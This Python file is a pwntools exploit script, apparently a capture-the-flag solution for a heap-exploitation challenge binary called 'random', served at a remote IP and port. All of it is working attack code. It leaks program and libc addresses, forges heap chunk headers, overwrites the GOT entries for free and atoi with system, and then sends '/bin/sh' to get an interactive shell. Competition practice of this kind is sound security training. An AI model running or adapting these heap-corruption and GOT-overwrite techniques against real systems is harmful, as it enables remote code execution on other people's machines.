from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./random")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./random")
else:
	p = remote("117.78.39.172","30598")
	libc = ELF("./libc-2.23.so")
	elf = ELF("./random")

def add(choice, choice2, size=0, content='aaaa'):
	p.sendlineafter("Do you want to add note?(Y/N)\n",str(choice))
	if choice == 'Y':
		p.sendlineafter("Input the size of the note:\n",str(size))
		p.sendafter("Input the content of the note:\n",content)
		p.sendlineafter("Do you want to add another note, tomorrow?(Y/N)\n",str(choice2))

def free(choice,index = "-1"):
	p.sendlineafter("Do you want to delete note?(Y/N)\n",str(choice))
	if choice == "Y":
		p.sendlineafter("Input the index of the note:\n",str(index))

def show(choice,index = "-1"):
	p.sendlineafter("Do you want to view note?(Y/N)\n",str(choice))
	if choice == "Y":
		p.sendlineafter("Input the index of the note:\n",str(index))

def edit(choice,index = "-1",content = ""):
	p.sendlineafter("Do you want to update note?(Y/N)\n",str(choice))
	if choice == "Y":
		p.sendlineafter("Input the index of the note:\n",str(index))
		p.sendafter("Input the new content of the note:\n",content)

def junk():
	p.sendlineafter("note?(Y/N)\n","N")

def init(name):
	p.sendafter("Please input your name:\n",name)

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}\nb *{b2}\nb *{b3}".format(b1 = hex(code_base + 0x17e9),b2 = hex(code_base + 0x11AC),b3 = hex(code_base + 0x184e)))
		#gdb.attach(p,"b *{b1}\nb *{b2}".format(b1 = hex(code_base + 0x17e9),b2 = hex(code_base + 0x11AC)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
# this can leak code_base or stack_base
init("a" * 8)
p.recvuntil("a"*8)
leak_addr = u64(p.recvuntil("?",drop = True).ljust(8,"\x00"))
codebase = leak_addr - 0xb90
elf.address = codebase
log.success("code_base:" + hex(codebase))
#debugf()
days = 0x23
p.sendlineafter("\n",str(days))
#add("Y","Y",0x17,"a\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(10))
junk()
junk()
add("Y","Y",0x17,"a\n")
for i in range(7):
	junk()
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(5))
for i in range(5):
	junk()
target = elf.address + 0x203168 + 0x28
payload = p64(target)[:7] + "\n"
add("Y","Y",0x17,"a\n")
free("Y",1)
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x21,"a\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,p64(0) + p64(0x21) + "\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,"c\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,payload)
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,p64(0) + p64(0x11) + "\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,"e\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,"f\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,"g\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(1))
junk()
add("Y","Y",0x17,"a\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,"a\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
add("Y","Y",0x17,"a\n")
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
payload = p64(elf.address + 0x203180) + p64(0x100) + p64(0)
add("Y","N",0x17,payload[:0x16] + "\n")
#debugf()
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(8))
payload = p64(elf.got["free"]) + p64(0x8)
payload += p64(elf.got["atoi"]) + p64(0x8)[:7] + "\n"
edit("Y",2,payload)
show("Y",1)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["atoi"]
log.success("libc_base:" + hex(libc.address))
for i in range(6):
	junk()
debugf()
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(7))
payload = p64(libc.symbols["system"])[:7] + "\n"
edit("Y",1,payload)
for i in range(6):
	junk()
p.sendlineafter("How many times do you want to play this game today?(0~10)\n","/bin/sh")
"""
add("Y","Y",0x17,"a\n")
for i in range(5):
	p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(0))
	add("Y","Y",0x17,"a\n")
debugf()
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(1))
junk()
add("Y","Y",0x17,"a\n")
#junk()
#debugf()
"""
"""
days = 10
times = [8,1,1,9]
p.sendlineafter("?\n",str(days))
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(times[0]))
debugf()
add("Y","Y",0x18,"a"*0x18) #0
for i in range(7):
	junk()
#debugf()
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(times[1]))
junk()
# size < 0x40
# input check \n & check length
add("Y","Y",0x18,"a\n")
free("Y",0)
#debugf()
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(times[2]))
junk()
add("Y","Y",0x18,"a"*0x18) #0
p.sendlineafter("How many times do you want to play this game today?(0~10)\n",str(times[3]))
#free("N")
"""
p.interactive()
